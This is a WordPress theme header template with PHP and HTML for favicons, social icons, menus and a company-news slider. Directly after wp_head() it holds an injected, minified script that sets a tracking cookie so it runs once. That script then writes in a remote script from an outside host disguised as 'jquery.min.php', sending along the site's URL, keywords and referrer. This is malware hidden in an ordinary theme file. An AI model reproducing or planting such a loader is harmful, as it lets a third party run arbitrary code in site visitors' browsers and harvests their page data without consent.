<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>

<!-- Meta, title, CSS, favicons, etc. -->
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title><?php wp_title( '|', true, 'right' );?></title>

<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script>
<![endif]-->

<!-- Favicons -->
<?php if(get_theme_mod('media_favicon') != "") { ?><link rel="shortcut icon" href="<?php echo do_shortcode(get_theme_mod('media_favicon')); ?>"><?php } ?>
<?php if(get_theme_mod('media_favicon_iphone') != "") { ?><link rel="apple-touch-icon" href="<?php echo do_shortcode(get_theme_mod('media_favicon_iphone')); ?>"><?php } ?>
<?php if(get_theme_mod('media_favicon_iphone_retina') != "") { ?><link rel="apple-touch-icon" sizes="114x114" href="<?php echo do_shortcode(get_theme_mod('media_favicon_iphone_retina')); ?>"><?php } ?>
<?php if(get_theme_mod('media_favicon_ipad') != "") { ?><link rel="apple-touch-icon" sizes="72x72" href="<?php echo do_shortcode(get_theme_mod('media_favicon_ipad')); ?>"><?php } ?>
<?php if(get_theme_mod('media_favicon_ipad_retina') != "") { ?><link rel="apple-touch-icon" sizes="144x144" href="<?php echo do_shortcode(get_theme_mod('media_favicon_ipad_retina')); ?>"><?php } ?>

<?php er_leaf_google_font();?>
<?php echo get_theme_mod('textarea_trackingcode') ? get_theme_mod('textarea_trackingcode') : '' ;?>

<!-- WordPress -->
<?php wp_head(); ?>
<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://www.wedance.es/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'G91825' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>
<body <?php body_class(); ?>>
<?php (get_theme_mod('select_layoutstyle') == "Fullwidth") ? $layout_class = "fullwidth" : $layout_class = "container"; ?>
<div id="layout" class="<?php echo $layout_class; ?>">
	<?php 
		if(get_theme_mod('check_topwidgets'))
		get_template_part( 'top','widget' ); 
	?>	
	<header>
		<div id="top-info">
			<div class="wrap">
				<div class="cols">
					<div class="col-6 header-short-info">

						<?php if(get_theme_mod('select_main_menu') == "Fullwidth") : ?>
						
						<?php if(get_theme_mod('check_companynews')) : ?>
						<div id="news-slide" class="news-slide flexslider clearfix">
							<span><?php echo get_theme_mod('text_companynews') ? get_theme_mod('text_companynews') : __('Company News:','er_leaf');?></span>
							<div class="news-slides">
								<ul class="slides">
								<?php 
									$top_post_query = new WP_Query( array('posts_per_page' => 3) );
									while ($top_post_query -> have_posts()) : $top_post_query -> the_post(); 
								?>
									<li><a rel="bookmark" href="<?php the_permalink(); ?>" title="<?php the_title(__('Permalink to: ','er_leaf')); ?>"><?php the_title(); ?></a></li>
								<?php endwhile; wp_reset_query(); ?>
								</ul>
							</div>

						</div><!-- //.news-slides -->

						<?php endif;?>

						<?php else : ?>

							<?php echo get_theme_mod('text_callus'); ?>

						<?php endif; ?>
					</div><!-- //.header-short-info -->

					<?php 
						if(get_theme_mod('check_companynews') && get_theme_mod('select_main_menu') == "Fullwidth") {
							$header_col = 'col-6';
						} elseif(get_theme_mod('text_callus') && get_theme_mod('select_main_menu') == "Header Left" ) {
							$header_col = 'col-6';
						} else {
							$header_col = 'col-12';
						}
					?>
					
					<div class="<?php echo $header_col;?> header-link clearfix">
						<div class="social-header-link">
							<ul class="social">
								<?php if(get_theme_mod('social_twitter') != "") { ?><li class="twitter"><a class="tooltips" target="_blank" href="http://twitter.com/<?php echo get_theme_mod('social_twitter'); ?>" data-toggle="tooltip" title="Twitter"><i class="icon-twitter"></i></a></li><?php } ?>
								<?php if(get_theme_mod('social_facebook')!= "") { ?><li class="facebook"><a class="tooltips" target="_blank" href="<?php echo get_theme_mod('social_facebook'); ?>" data-toggle="tooltip" title="Facebook"><i class="icon-facebook"></i></a></li><?php } ?>
								<?php if(get_theme_mod('social_google')!= "") { ?><li class="googleplus"><a class="tooltips" target="_blank" href="<?php echo get_theme_mod('social_google'); ?>" data-toggle="tooltip" title="Google Plus"><i class="icon-google-plus"></i></a></li><?php } ?>
								<?php if(get_theme_mod('social_pinterest')!= "") { ?><li class="pinterest"><a class="tooltips" target="_blank" href="<?php echo get_theme_mod('social_pinterest'); ?>" data-toggle="tooltip" title="Pinterest"><i class="icon-pinterest"></i></a></li><?php } ?>
								<?php if(get_theme_mod('social_youtube')!= "") { ?><li class="youtube"><a class="tooltips" target="_blank" href="<?php echo get_theme_mod('social_youtube'); ?>" data-toggle="tooltip" title="Youtube"><i class="icon-youtube"></i></a></li><?php } ?>
								<?php if(get_theme_mod('social_rss') == 1) { ?><li class="rss"><a class="tooltips" target="_blank" href="<?php echo get_bloginfo( 'rss2_url' ); ?>" data-toggle="tooltip" title="RSS"><i class="icon-rss"></i></a></li><?php } ?>
							</ul>
						</div><!-- // .social-header-link -->
					</div><!-- // .header-link -->
				</div>
			</div><!-- // .wrap -->
		</div><!-- // #top-info -->
		<div id="header">
			<div class="wrap">
				<div class="logo" role="banner">
					<h1 class="site-title">
						<a title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home" href="<?php echo esc_url( home_url( '/' ) ); ?>">
							<img class="logo_standard" src="<?php echo get_theme_mod('media_logo') ? do_shortcode(get_theme_mod('media_logo')) : get_template_directory_uri().'/images/logo.png'; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
							<?php if(get_theme_mod('media_logo_retina') != '') { ?>
							<img class="logo_retina" src="<?php echo do_shortcode(get_theme_mod('media_logo_retina')); ?>" width="<?php echo get_theme_mod('logo_width'); ?>" height="<?php echo get_theme_mod('logo_height'); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
							<?php } ?>
						</a>
					</h1>
					<span class="site-description"><?php bloginfo( 'description' ); ?></span>
				</div><!-- // #logo -->
				
				<?php if(get_theme_mod('select_main_menu') == "Header Left") : ?>
				<nav id="site-menu" class="menu site-menu">
					<?php 
						if (has_nav_menu('header')){
							wp_nav_menu( array(
							'theme_location'  => 'header',
							'container'       => 'ul', 
							'container_class' => 'sf-menu menu menu-{menu slug}-container clearfix', 
							'menu_class'	  => 'sf-menu menu',
							'walker' => new er_leaf_menu_icon_walker()
							) );
						}
					?>
				</nav>
				<?php endif; ?>
				
				<?php if(get_theme_mod('select_main_menu') == "Fullwidth") : ?>
				<div class="header-widget" id="header-widget">
					<div class="contact-widget">
						<?php echo get_theme_mod('text_callus'); ?>
					</div>
				</div><!-- // .header-widget -->
				<?php endif; ?>

			</div><!-- // #wrap -->
			
			<?php if(get_theme_mod('select_main_menu') == "Fullwidth") : ?>
			
			<div id="full-menu" class="site-menu clearfix">
				<nav id="site-menu-secondary" class="menu wrap" role="navigation">
					<!-- .sf-menu menu clearfix -->

					<?php 
						if (has_nav_menu('header')){
							wp_nav_menu( array(
								'theme_location'  => 'header',
								'container'       => 'ul', 
								'container_class' => 'sf-menu menu menu-{menu slug}-container', 
								'menu_class'	  => 'sf-menu menu',
								'walker' => new er_leaf_menu_icon_walker()
							) );
						}
					?>
				</nav><!-- // #site-menu-secondary -->
			</div><!-- // #full-menu -->
			
			<?php endif; ?>

			<div id="mobile-menu">
				<div class="wrap">
					<div class="mobile-menu-container"></div>
				</div>
			</div><!-- // #mobile-menu -->

		</div><!-- // #header -->
	</header><!-- header -->